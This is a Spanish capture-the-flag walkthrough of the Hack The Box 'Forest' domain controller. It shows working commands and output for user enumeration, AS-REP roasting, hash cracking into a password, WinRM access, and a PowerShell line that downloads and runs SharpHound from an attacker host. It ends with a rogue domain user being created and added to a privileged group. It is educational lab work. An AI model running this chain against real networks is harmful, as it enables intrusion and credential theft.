@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Forest - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Maquina Forest - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Forest de hackthebox una maquina windows de dificultad facil, en esta ocasión vamos a enfrentarnos contra un DC donde enumeraremos usuarios a traves de rpc y mediante un As-RepRoast attack solicitando un TGT obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por winrm a el equipo; despues enumerando el sistema con Bloodhound nos aprovecharemos de los permisos del grupo Account Operators para crear un usuario en el dominio y efectuar un Dcsync attack donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario Administrator. Maquina curiosa asi que vamos a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Forest de hackthebox una maquina windows de dificultad facil, en esta ocasión vamos a enfrentarnos contra un DC donde enumeraremos usuarios a traves de rpc y mediante un As-RepRoast attack solicitando un TGT obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por winrm a el equipo; despues enumerando el sistema con Bloodhound nos aprovecharemos de los permisos del grupo Account Operators para crear un usuario en el dominio y efectuar un Dcsync attack donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario Administrator. Maquina curiosa asi que vamos a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Forest" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Forest" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Forest/forest.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-11T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Forest/forest.png" />
+<meta property="twitter:title" content="Maquina Forest - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-10-11T00:00:00-05:00","datePublished":"2023-10-11T00:00:00-05:00","description":"El dia de hoy vamos a resolver Forest de hackthebox una maquina windows de dificultad facil, en esta ocasión vamos a enfrentarnos contra un DC donde enumeraremos usuarios a traves de rpc y mediante un As-RepRoast attack solicitando un TGT obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por winrm a el equipo; despues enumerando el sistema con Bloodhound nos aprovecharemos de los permisos del grupo Account Operators para crear un usuario en el dominio y efectuar un Dcsync attack donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario Administrator. Maquina curiosa asi que vamos a darle!.","headline":"Maquina Forest - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Forest/forest.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Forest"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Forest"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Forest - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-10-11">11 Oct 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Forest/forest.png" alt="Maquina Forest - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Forest</code> de <code>hackthebox</code> una maquina <code>windows</code> de dificultad facil, en esta ocasión vamos a enfrentarnos contra un <code>DC</code> donde enumeraremos usuarios a traves de <code>rpc</code> y mediante un <code>As-RepRoast attack</code> solicitando un <code>TGT</code> obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por <code>winrm</code> a el equipo; despues enumerando el sistema con <code>Bloodhound</code> nos aprovecharemos de los permisos del grupo <code>Account Operators</code> para crear un usuario en el dominio y efectuar un <code>Dcsync attack</code> donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario <code>Administrator</code>.</p>
+
+<p>Maquina curiosa asi que vamos a darle!.</p>
+
+<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Forest
+❯ ls
+
+ Forest
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.161
+PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
+64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=113 ms
+
+--- 10.10.10.161 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 113.161/113.161/113.161/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>127</code> y por proximidad seria correspondiente a una maquina <code>windows</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-09 11:56 -05
+Initiating SYN Stealth Scan at 11:56
+Scanning 10.10.10.161 [65535 ports]
+Nmap scan report for 10.10.10.161
+Host is up, received user-set (0.12s latency).
+Scanned at 2023-10-09 11:56:58 -05 for 21s
+Not shown: 65290 closed tcp ports (reset), 221 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49677/tcp open  unknown          syn-ack ttl 127
+49684/tcp open  unknown          syn-ack ttl 127
+49706/tcp open  unknown          syn-ack ttl 127
+49934/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
+           Raw packets sent: 104093 (4.580MB) | Rcvd: 86582 (3.463MB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java"># Nmap 7.93 scan initiated Mon Oct  9 11:58:50 2023 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49934 -oN targeted 10.10.10.161
+Nmap scan report for 10.10.10.161
+Host is up (0.22s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 17:05:41Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49706/tcp open  msrpc        Microsoft Windows RPC
+49934/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2023-10-09T10:06:39-07:00
+| smb2-time: 
+|   date: 2023-10-09T17:06:35
+|_  start_date: 2023-10-09T14:03:53
+|_clock-skew: mean: 2h26m44s, deviation: 4h02m32s, median: 6m42s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Oct  9 12:00:09 2023 -- 1 IP address (1 host up) scanned in 78.92 seconds
+</code></pre>
+
+<p>Entre los puertos abiertos mas relevantes podemos visualizar:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>53</td>
+      <td>DNS</td>
+      <td>Simple DNS Plus</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td>KERBEROS</td>
+      <td>Microsoft Windows Kerberos</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>139</td>
+      <td>NETBIOS</td>
+      <td>Microsoft Windows netbios-ssn</td>
+    </tr>
+    <tr>
+      <td>389</td>
+      <td>LDAP</td>
+      <td>Microsoft Windows Active Directory LDAP</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>Windows Server 2016 Standard</td>
+    </tr>
+    <tr>
+      <td>3268</td>
+      <td>LDAP</td>
+      <td>Microsoft Windows Active Directory LDAP</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WINRM</td>
+      <td>Microsoft HTTPAPI httpd 2.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotacion">EXPLOTACION <a href="#explotacion">#</a></h2>
+
+<p>Como vemos que el puerto <code>445</code> esta abierto, con <code>crackpamexec</code> podemos tratar de enumerar a lo que nos enfrentamos.</p>
+
+<pre><code class="language-bash">❯ crackmapexec smb 10.10.10.161
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+</code></pre>
+
+<p>Vemos que nos enfrentamos a un <code>Windows Server 2016</code> y que el <code>smb</code> esta firmado, ahora bien vamos a proceder a agregar el dominio a nuestro <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.161 htb.local" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Ahora al tratarse de un <code>Domain Controller</code> podemos tratar de enumerar usuarios validos con <code>rpclient</code> a traves de un <code>null session</code>.</p>
+
+<pre><code class="language-bash">❯ rpcclient -U '' 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]'
+Administrator
+Guest
+krbtgt
+DefaultAccount
+$331000-VK4ADACQNUCA
+SM_2c8eef0a09b545acb
+SM_ca8c2ed5bdab4dc9b
+SM_75a538d3025e4db9a
+SM_681f53d4942840e18
+SM_1b41c9286325456bb
+SM_9b69f1b9d2cc45549
+SM_7c96b981967141ebb
+SM_c75ee099d0a64c91b
+SM_1ffab36a2f5f479cb
+HealthMailboxc3d7722
+HealthMailboxfc9daad
+HealthMailboxc0a90c9
+HealthMailbox670628e
+HealthMailbox968e74d
+HealthMailbox6ded678
+HealthMailbox83d6781
+HealthMailboxfd87238
+HealthMailboxb01ac64
+HealthMailbox7108a4e
+HealthMailbox0659cc1
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+</code></pre>
+
+<p>Como tenemos un listado potencial de usuarios, podemos tratar de efectuar un <code>ASREProast Attack</code> para tratar de obtener un <code>TGT - ticket granting ticket</code> que basicamente se traduce a un hash que podemos tratar de crackear. Para ello vamos a exportar los usuarios obtenidos en un archivo.</p>
+
+<pre><code class="language-bash">❯ GetNPUsers.py -no-pass -usersfile users htb.local/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:7d76b9feda1646146b12dce5ca4b85bb$a6cf183aa4803f1d4e54123a24516e4e6468c484ae6735370d270e74ff7a09f9a0fcc28abfe3e79f3c3995693abdcb9009043f2a6f941780e8b028b68f0d6727b269f4f7eb0939fb049ed9103c1bf81c9b707fbf20acddd0166ff1fe591c0f8c38115ce7696a9a2c62787cad92c6fc8130ef0ab36e40f8512caf4b2896860a60c87ec78611aa67cf8bf0c570530974ee8e2f090e5979aa7387a34d4456688a9a08e71c79714e341b4bed2f120836a3a95831f462da15bec11d56c6a1445be3db49a32f0751c00b73df61a4558d3c0bc5187f3df9fef3c7824ed43ae7baa22682450724dcc52b
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+
+<p>Procedemos a crackear el hash y obtenemos unas credenciales <code>svc-alfresco:s3rvice</code></p>
+
+<pre><code class="language-bash">❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
+1g 0:00:00:06 DONE (2023-10-11 14:27) 0.1510g/s 617184p/s 617184c/s 617184C/s s521379846..s3r2s1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<p>Validamos las credenciales y como el puerto <code>5985</code> se encuentra abierto podemos tratar de conectarnos por <code>winrm</code></p>
+
+<pre><code class="language-bash">❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
+HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+</code></pre>
+
+<p>Nos conectamos al servicio, despues nos dirigimos al directorio personal del usuario <code>svc-alfresco</code> y podemos visualizar la primera flag <code>user.txt</code></p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami
+htb\svc-alfresco
+Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd ..\Desktop
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; type user.txt
+a5bdfec1b06f0a66536a4227d3dfc27d
+</code></pre>
+
+<h2 id="elevacion-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#elevacion-de-privilegios">#</a></h2>
+
+<p>Como nos enfrentamos a un <code>DC</code> vamos a usar <code>BloodHound</code> para tratar de enumerar vias potenciales para elevar nuestros privilegios.</p>
+
+<p>Para instalarlos solo debemos ejecutar:</p>
+
+<pre><code class="language-bash">apt install neo4j, bloodhound -y
+</code></pre>
+
+<p>Si tienes problemas con la instalación puedes instalar una versión especifica de <code>neo4j</code> de:</p>
+
+<ul>
+  <li><a href="https://debian.neo4j.com/">https://debian.neo4j.com/</a></li>
+</ul>
+
+<p>y puedes descargar un release de <code>bloodhound</code> directamente del repositorio de github:</p>
+
+<ul>
+  <li><a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></li>
+</ul>
+
+<p>Una vez instalado ejecuta el comando <code>neo4j console</code> y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto <code>neo4j:no4oj</code> y te pedira cambies la contraseña por defecto a la que desees.</p>
+
+<pre><code class="language-bash">❯ neo4j console
+Starting Neo4j.
+2023-10-11 20:21:29.970+0000 INFO  Starting...
+2023-10-11 20:21:30.757+0000 INFO  This instance is ServerId{379de84c} (379de84c-82dc-4a72-beab-b327d0181e30)
+2023-10-11 20:21:33.391+0000 INFO  ======== Neo4j 4.4.26 ========
+2023-10-11 20:21:36.106+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
+2023-10-11 20:21:36.659+0000 INFO  Bolt enabled on localhost:7687.
+2023-10-11 20:21:37.946+0000 INFO  Remote interface available at http://localhost:7474/
+</code></pre>
+
+<p><img src="/assets/images/HTB/htb-writeup-Forest/forest1.PNG" alt="" /></p>
+
+<p>Estas credenciales seran la que usaras para logearte al abrir <code>Bloodhound</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Forest/forest2.PNG" alt="" /></p>
+
+<p>Ahora descargaremos el script de powershell <code>sharphound.ps1</code> que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al <code>bloodhound</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1">https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1</a></li>
+</ul>
+
+<p>Subimos el script y lo interpretamos con <code>Iex</code>.</p>
+
+<pre><code class="language-bash">Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; mkdir bloodhound
+
+    Directory: C:\Users\svc-alfresco\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/11/2023   2:46 PM                bloodhound
+
+
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; cd bloodhound
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/SharpHound.ps1')
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; Invoke-BloodHound -CollectionMethod All
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; dir
+
+    Directory: C:\Users\svc-alfresco\Desktop\bloodhound
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/11/2023   2:48 PM          15433 20231011144852_BloodHound.zip
+-a----       10/11/2023   2:48 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+</code></pre>
+
+<p>Nos traemos el archivo a nuestro equipo y lo importamos en el <code>Bloodhound</code>.</p>
+
+<pre><code class="language-bash">Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; download C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip
+                                        
+Info: Downloading C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip to 20231011144852_BloodHound.zip
+                                        
+Info: Download successful!
+</code></pre>
+
+<p>Le asignamos un nombre mas descriptivo al comprimido.</p>
+
+<pre><code class="language-bash">❯ ls
+ 20231011144852_BloodHound.zip   hash   SharpHound.ps1   users
+❯ mv 20231011144852_BloodHound.zip bh_data.zip
+❯ ls
+ bh_data.zip   hash   SharpHound.ps1   users
+</code></pre>
+
+<p>Ahora lo subimos al <code>BloodHound</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Forest/forest3.PNG" alt="" /></p>
+
+<p>Como comprometimos al usuario <code>svc-alfresco</code> vamos a marcarlo como comprometido.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Forest/forest4.PNG" alt="" /></p>
+
+<p>Vemos que el usuario alfresco esta dentro del grupo <code>Account Operators</code> y este tiene el privilegio <code>GenericAll</code> sobre <code>Exchange Windows Permissions</code>, que a su vez tiene <code>WriteDacl</code> sobre <code>htb.local</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Forest/forest5.PNG" alt="" /></p>
+
+<p>Estando dentro del grupo <code>Account Operators</code> podemos crear un usuario e incorporarlo en nuevos grupos. Por lo que vamos a crear un usuario y lo agregaremos al grupo <code>Exchange Windows Permissions</code>.</p>
+
+<pre><code class="language-bash">Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; net user fmiracle fmiracle123$! /add /domain
+The command completed successfully.
+
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&gt; net group "Exchange Windows Permissions" fmiracle /add
+The command completed successfully.
